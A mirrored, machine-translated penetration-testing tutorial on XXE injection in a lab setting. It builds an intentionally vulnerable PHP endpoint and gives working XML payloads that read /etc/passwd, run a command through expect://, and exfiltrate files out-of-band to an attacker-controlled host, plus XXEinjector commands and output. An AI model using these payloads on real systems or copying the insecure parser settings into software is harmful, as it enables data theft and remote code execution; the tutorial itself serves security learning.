<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Exploiting eXternal Entity XML (XXE) Vulnerabilities</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="During penetration testing, we may encounter a vulnerability that allows us to perform XML eXternal Entity (XXE) Injection attacks. XXE Injection is a...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Exploiting eXternal Entity XML (XXE) Vulnerabilities</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/files/357/1b2/4f3/3571b24f30dc493f843af3c03241c6eb.gif"></div><br>  During penetration testing, we may encounter a vulnerability that allows us to perform XML eXternal Entity (XXE) Injection attacks.  XXE Injection is a type of attack on an application that analyzes XML input.  Although this is a relatively esoteric vulnerability compared to other web application attacks, such as Cross-Site Request Forgery (CSRF), we make the most of this vulnerability when it appears, since it can lead to the extraction of sensitive data and even remote code execution (RCE).  In this article, we will look at setting up a vulnerable PHP server, exploiting the vulnerability manually, and then move on to a handy tool called XXEInjector to automate this process. <br><a name="habracut"></a><br>  We will use two sites.  The first is a simple PHP server, and the second is a virtual machine with a vulnerable Django web application.  Links to applications and vulnerable scripts are provided at the end of the article. <br><br><h2>  Customization </h2><br>  Before learning more about this attack, it will be helpful to understand how a web application interacts with an XML document, allowing you to exploit this vulnerability.  To do this, we use a PHP virtual machine that uses an XML document to validate credentials. <br><br>  We use Ubuntu, PHP 5 and Apache as a web server as a virtual machine (but we do not recommend using Apache on production servers).  You will also need a php-xml module for parsing XML. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      For testing use the following code: <br><br><pre><code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span>    libxml_disable_entity_loader (<span class="hljs-keyword"><span class="hljs-keyword">false</span></span>);    $xmlfile = file_get_contents(<span class="hljs-string"><span class="hljs-string">'php://input'</span></span>);    $dom = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $user = $creds-&gt;user;    $pass = $creds-&gt;pass;    <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"You have logged in as user $user"</span></span>; <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  The above script is triggered when a request is made to /xml_injectable.php. <br><br><pre> <code class="php hljs">&lt;creds&gt;   &lt;user&gt;Ed&lt;/user&gt;   &lt;pass&gt;mypass&lt;/pass&gt; &lt;/creds&gt;</code> </pre><br>  The four lines above are expected to be inserted into the above PHP endpoint, and they will be saved in an XML file called xml.txt.  This file uses the POST request data via CURL: <br><br><img src="https://habrastorage.org/files/758/08b/6f7/75808b6f7cfb433cb80d30130f52fe8c.png"><br><br>  The most interesting aspect of analyzing input XML files is that they can contain code that points to a file on the server itself.  This is an example of an external entity.  We will look at the full range of external objects, including files hosted on the Internet via FTP and HTTP. <br><br>  Let's modify the xml.txt file so that it contains the following code: <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">source</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">lang</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"xml"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY &lt;b&gt;xxe&lt;/b&gt; SYSTEM &lt;b&gt;"file:///etc/passwd&lt;/b&gt;" &gt;]&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">creds</span></span></span><span class="hljs-tag">&gt;</span></span>   <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span>&amp;xxe;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">b</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span>   <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span>mypass<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">creds</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Notice the xxe element.  After sending the request with POST data, the victim server will respond with the contents of / etc / passwd: <br><br><img src="https://habrastorage.org/files/dbd/862/7ec/dbd8627ec6344182b62d9686165a145e.png"><br><br>  Xml.txt tells the server to look for an external object, the file: / etc / passwd, and then enter the contents in the "user" field. <br><br><h2>  Remote code execution </h2><br>  If luck is on our side, and the PHP parsing module is loaded, we can use RCE.  Let's change the content of our file: <br><br><pre> <code class="xml hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span> <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">creds</span></span></span><span class="hljs-tag">&gt;</span></span>   <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span>&amp;xxe;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">user</span></span></span><span class="hljs-tag">&gt;</span></span>  <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span>mypass<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pass</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">creds</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  The response from the server will be as follows: <br><br><img src="https://habrastorage.org/files/3e6/3ac/1c6/3e63ac1c65e2472eab9a763a22e29c0b.png"><br><br>  However, such cases where RCE is possible through XXE are quite rare. <br><br><h2>  Automate XXE Injection with Burp and XXEinjector </h2><br>  Let's test automated tools to detect such vulnerabilities.  We use the TurnKey Linux virtual machine, which runs the Django web application vulnerable to XXEi.  We also use one of the popular web application vulnerability search tools - Burp Suite. <br><br>  Unzip and run the VM configuration file (.vmx).  The download file includes a readme file that helps you set up a private network on your computer. <br><br>  The VM server has a vulnerable form - /static/mailingList.html.  Send multiple random values ‚Äã‚Äãand scan the Burp request with a scanner. <br><br>  Burp should alert us to the XXE vulnerability, along with some dependent XSS as a bonus. <br><br><img src="https://habrastorage.org/files/b31/958/27b/b3195827b3de4875ae69110f5edfbd23.png"><br><br>  In fact, the professional version of Burp is fast enough to use the Burp Collaborator, an external service that Burp can use to help detect vulnerabilities or use targets. <br><br>  In essence, a Collaborator request sent by Burp to a vulnerable application is intended to call Burp Collaborator through DNS resolution and web requests, which, if successful, will inform Burp that the target computer has completed the malicious payload.  Most vulnerabilities can be discovered by examining or logging the response, but sometimes with an external service such as Burp Collaborator, you can go to the next level.  In this case, Burp pulled out the file / etc / passwd itself. <br><br>  The following images show the work of the Collaborator. <br><br><img src="https://habrastorage.org/files/5f0/219/c48/5f0219c486724406ba6e0b37ea33256e.png"><br><br><img src="https://habrastorage.org/files/c5e/104/e2b/c5e104e2bfc74930bd19d832c779dd7a.png"><br><br><img src="https://habrastorage.org/files/a7a/daf/c73/a7adafc73d474b7fb37f79309aed656f.png"><br><br>  To most accurately control the injection process, we use the XXEinjector.  We will need a pending request.  We will save this code in the file request.txt. <br><br><img src="https://habrastorage.org/files/fed/83d/7b0/fed83d7b096048aaa55a1e743ec44a42.png"><br><br><h2>  Methodology XXEinjector </h2><br>  XXEinjector sends a payload that tells the remote server to respond with the requested file.dtd.  In the same request from XXEinjector, we call two other entities that can be executed only if file.dtd successfully goes to the victim's web server and is interpreted correctly.  For example, in order for this to work on our PHP server, we need to specify the XXEinjector flag to encode our code in base64.  Base64 uses a limited set of characters that will not cause interpreters to fail during the execution of an exploit (for example, quotes), and it needs an additional decoding step so that WAF / IDS / IPS cannot block it. <br><br>  The request is as follows: <br><br>  <b>POST /xml_injectable.php HTTP / 1.1</b> <b><br></b>  <b>User-Agent: Mozilla / 5.0 (Macintosh; Intel Mac OS X 10.11; rv: 49.0) Gecko / 20100101 Firefox / 49.0</b> <b><br></b>  <b>Accept: text / html, application / xhtml + xml, application / xml; q = 0.9, * / *; q = 0.8</b> <b><br></b>  <b>Accept-Language: en-US, en; q = 0.5</b> <b><br></b>  <b>Accept-Encoding: gzip, deflate</b> <b><br></b>  <b>Connection: close</b> <b><br></b>  <b>Upgrade-Insecure-Requests: 1</b> <b><br></b>  <b>Content-Length: 158</b> <b><br></b>  <b>Host: 192.168.242.139</b> <b><br></b>  <b>Content-Type: application / x-www-form-urlencoded</b> <b><br></b>  <b>&lt;! DOCTYPE convert [&lt;! ENTITY% remote SYSTEM " <a href="http://192.168.240.1/">192.168.240.1</a> : 80 / file.dtd"&gt;% remote;% int;% trick;]&gt;</b> <b><br></b>  <b>blah</b> <b><br></b>  <b>mypass</b> <b><br></b> <br>  The attacked server parses the request and inserts a ‚Äúremote‚Äù for the contents of the file file.dtd (after accessing our attacking machine).  File File.dtd looks like this: <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">!ENTITY</span></span></span><span class="hljs-tag"> % </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">payl</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">SYSTEM</span></span></span><span class="hljs-tag"> "</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">file:</span></span></span><span class="hljs-tag">///</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">etc</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">passwd</span></span></span><span class="hljs-tag">"&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">!ENTITY</span></span></span><span class="hljs-tag"> % </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">int</span></span></span><span class="hljs-tag"> "&lt;!</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ENTITY</span></span></span><span class="hljs-tag"> % </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">trick</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">SYSTEM</span></span></span><span class="hljs-tag"> '</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">192.168.240.1:80</span></span></span><span class="hljs-tag">/?</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">p</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">%payl;</span></span></span><span class="hljs-tag">'&gt;</span></span>"&gt;</code> </pre> <br>  Notice, we define a new entity, ‚Äúpayl,‚Äù which is the URL of the file we are trying to extract.  Then we define two missing objects from the previous query: ‚Äúint‚Äù and ‚Äútrick‚Äù.  Note that ‚Äútrick‚Äù is an object defined in another object - ‚Äúint‚Äù.  Finally, note that this code is not encoded.  Some characters are encoded due to the embedding of one object in another, but the request itself is not encoded in base64. <br><br>  Now we have all our essences.  Note that in the definition of the ‚Äútrick‚Äù entity, we replace the contents of ‚Äúpayl‚Äù with the contents of / etc / passwd.  This means that all the victim server has to do is send a request to the server running XXEinjector, passing the contents of / etc / passwd as a parameter to this URL.  The application does not need to return the contents of the / etc / passwd file in response to the vulnerable web form / application page.  It simply sends the request with the contents in this parameter.  XXEinjector analyzes the parameter and saves it in a file.  Done! <br><br><h2>  Practical example </h2><br>  Let's return to our first site - a simple PHP server that works with the xml_injectable.php script.  Let's modify the PHP script by commenting on irrelevant code. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span>   libxml_disable_entity_loader (<span class="hljs-keyword"><span class="hljs-keyword">false</span></span>);   $xmlfile = file_get_contents(<span class="hljs-string"><span class="hljs-string">'php://input'</span></span>);   $dom = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> DOMDocument();   $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);  <span class="hljs-comment"><span class="hljs-comment">// $creds = simplexml_import_dom($dom);  // $user = $creds-&gt;user;  // $pass = $creds-&gt;pass;  // echo "You have logged in as user $user"; </span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">?&gt;</span></span></span></span></code> </pre> <br>  Thus, the script loads an XML-formatted request into a PHP object.  We parse an XML document in a PHP object.  Let's run the sample request XXEinjector. <br><br>  <b>&gt; sudo ruby ‚Äã‚ÄãXXEinjector.rb --host = 192.168.240.1 - path = / etc / passwd</b> <b><br></b>  <b>--file = phprequest.txt --proxy = 192.168.240.1: 8080 --oob = http --verbose</b> <br><br><br><br>  <b>POST /xml_injectable.php HTTP / 1.1</b> <b><br></b>  <b>Host: 192.168.242.139</b> <b><br></b>  <b>User-Agent: Mozilla / 5.0 (Macintosh; Intel Mac OS X 10.11; rv: 49.0) Gecko / 20100101 Firefox / 49.0</b> <b><br></b>  <b>Accept: text / html, application / xhtml + xml, application / xml; q = 0.9, * / *; q = 0.8</b> <b><br></b>  <b>Accept-Language: en-US, en; q = 0.5</b> <b><br></b>  <b>Accept-Encoding: gzip, deflate</b> <b><br></b>  <b>Connection: close</b> <b><br></b>  <b>Upgrade-Insecure-Requests: 1</b> <b><br></b>  <b>XXEINJECT</b> <b><br></b>  <b>blah</b> <b><br></b>  <b>mypass</b> <b><br><br></b> <br><br>  After launching this query, we get the following result from XXEinjector: <br><br>  <b>Enumeration locked.</b> <b><br></b>  <b>Sending request with malicious XML:</b> <b><br></b>  <b><a href="http://192.168.242.139/xml_injectable.php">192.168.242.139/xml_injectable.php</a></b> <b><br></b>  <b>{"User-Agent" =&gt; "Mozilla / 5.0 (Macintosh; Intel Mac OS X 10.11; rv: 49.0) Gecko / 20100101 Firefox / 49.0", "Accept" =&gt; "text / html, application / xhtml + xml, application /xml;q=0.9,*/*;q=0.8 "," Accept-Language "=&gt;" en-US, en; q = 0.5 "," Accept-Encoding "=&gt;" gzip, deflate "," Connection "=&gt;" Close "," Upgrade-Insecure-Requests "=&gt;" 1 "," Content-Length "=&gt;" 158 "}</b> <b><br><br></b>  <b>&lt;! DOCTYPE convert [&lt;! ENTITY% remote SYSTEM</b> <b><br></b>  <b>" <a href="http://192.168.240.1/">192.168.240.1</a> : 80 / file.dtd"&gt;% remote;% int;% trick;]&gt;</b> <b><br></b>  <b>blah</b> <b><br></b>  <b>mypass</b> <b><br><br><br></b>  <b>Got request for XML:</b> <b><br></b>  <b>HTTP GET /file.dtd / 1.0</b> <b><br><br></b>  <b>Responding with XML for: / etc / passwd</b> <b><br></b>  <b>XML payload sent:</b> <b><br></b>  <b>&lt;! ENTITY% payl SYSTEM "file: /// etc / passwd"&gt;</b> <b><br></b>  <b>&lt;! ENTITY% int "&lt;! ENTITY% trick SYSTEM</b> <b><br></b>  <b>'http://192.168.240.1:80/?p=%payl;'&gt; "&gt;</b> <b><br><br></b>  <b>FTP / HTTP did not get response.</b>  <b>XML parser cannot parse provided file or the application is not responsive.</b>  <b>Wait or Next?</b> <br><br>  Due to the use of multiple flags, we can see exactly what XXEinjector is doing.  We see that XXEinjector caused the victim server to respond with the file /file.dtd. <br><br>  After examining our error log from Apache, we noticed that our loadXML method did not receive enough data to force it to issue a file. <br><br>  <b>[Sun Nov 06 09: 10: 46.145222 2016] [: error] [pid 1222] [client 192.168.242.1:64701] PHP Notice: DOMDocument :: loadXML (): PEReference:% int;</b>  <b>not found in Entity, line: 1 in /var/www/html/xml_injectable.php on line 16</b> <b><br><br></b>  <b>[Sun Nov 06 09: 10: 46.145257 2016] [: error] [pid 1222] [client 192.168.242.1:64701] PHP Notice: DOMDocument :: loadXML (): PEReference:% trick;</b>  <b>not found in Entity, line: 1 in /var/www/html/xml_injectable.php on line 16</b> <b><br></b> <br><br>  After some research into the semantics of XML and loadXML, we came to the realization that there is a problem with the encoding - with how the file is specified (/ etc / passwd).  Fortunately, XXEinjector has a flag to encode this string.  We simply add the --phpfilter flag to our request. <br><br>  <b>&gt; sudo ruby ‚Äã‚ÄãXXEinjector.rb --host = 192.168.240.1 - path = / etc / passwd - file = phprequest.txt - proxy = 192.168.240.1: 8080 - ooo = http - verbose - phpfilter</b> <br><br>  Result of performance: <br><br>  <b>XXEinjector by Jakub Pa≈Çaczy≈ÑskiDTD injected.</b> <b><br></b>  <b>Enumeration locked.</b> <b><br></b>  <b>Sending request with malicious XML:</b> <b><br></b>  <b><a href="http://192.168.242.139/xml_injectable.php">192.168.242.139/xml_injectable.php</a></b> <b><br></b>  <b>{"User-Agent" =&gt; "Mozilla / 5.0 (Macintosh; Intel Mac OS X 10.11; rv: 49.0) Gecko / 20100101 Firefox / 49.0", "Accept" =&gt; "text / html, application / xhtml + xml, application /xml;q=0.9,*/*;q=0.8 "," Accept-Language "=&gt;" en-US, en; q = 0.5 "," Accept-Encoding "=&gt;" gzip, deflate "," Connection "=&gt;" Close "," Upgrade-Insecure-Requests "=&gt;" 1 "," Content-Length "=&gt;" 158 "}</b> <b><br><br></b>  <b>&lt;! DOCTYPE convert [&lt;! ENTITY% remote SYSTEM " <a href="http://192.168.240.1/">192.168.240.1</a> : 80 / file.dtd"&gt;% remote;% int;% trick;]&gt;</b> <b><br><br></b>  <b>blah</b> <b><br></b>  <b>mypass</b> <b><br><br><br></b>  <b>Got request for XML:</b> <b><br></b>  <b>HTTP GET /file.dtd / 1.0</b> <b><br></b>  <b>Responding with XML for: / etc / passwd</b> <b><br></b>  <b>XML payload sent:</b> <b><br></b>  <b>&lt;! ENTITY% payl SYSTEM "php: //filter/read=convert.base64-encode/resource=file: /// etc / passwd"&gt;</b> <b><br></b>  <b>&lt;! ENTITY% int "&lt;! ENTITY% trick SYSTEM</b> <b><br></b>  <b>'http://192.168.240.1:80/?p=%payl;'&gt; "&gt;</b> <b><br><br></b>  <b>Response with file / directory content received:</b> <b><br></b>  <b>GET /? P = cm9vdDp4OjA6M (rest of base64 encoded string) HTTP / 1.0</b> <b><br><br></b>  <b>Enumeration unlocked.</b> <b><br></b>  <b>Successfully logged file: / etc / passwd</b> <b><br></b>  <b>Nothing else to do.</b>  <b>Exiting.</b> <br><br>  After checking in our catalog XXEinjector Logs we will see the cherished dumps. <br><br><h2>  Links </h2><br>  ‚Üí <a href="https://drive.google.com/file/d/0B0lXZ1OX4ZS-aUdoRUVQSDg3eG8/view">Vulnerable Django VM</a> (password: mcfatty) <br>  ‚Üí <a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a> <br>  ‚Üí <a href="http://colesec.inventedtheinternet.com/attacking-xml-with-xml-external-entity-injection-xxe/">Vulnerable PHP Script</a> </div><p>Source: <a href="https://habr.com/ru/post/325270/">https://habr.com/ru/post/325270/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../325256/index.html">Cheap cloud backup with encryption for home</a></li>
<li><a href="../325258/index.html">Through thorns to the stars: why you need to seek access to users, and how to do it</a></li>
<li><a href="../325262/index.html">Free image compression tools to speed up the site</a></li>
<li><a href="../325264/index.html">Release DBMS InterSystems Cach√© 2017.1</a></li>
<li><a href="../325268/index.html">Formation of the Support Division of the Krasnodar studio Plarium</a></li>
<li><a href="../325272/index.html">7 workflow optimization techniques you may not have heard about</a></li>
<li><a href="../325274/index.html">CAPWAP State Machine in the Cisco Unified Wireless Implementation: Join State</a></li>
<li><a href="../325276/index.html">Zabbix for DevOps: how we implemented the monitoring system in the development and testing processes</a></li>
<li><a href="../325278/index.html">Abstract lectures on the design of game mechanics sandbox projects from the creator of Life is Feudal</a></li>
<li><a href="../325280/index.html">Specification Design Pattern in C #</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>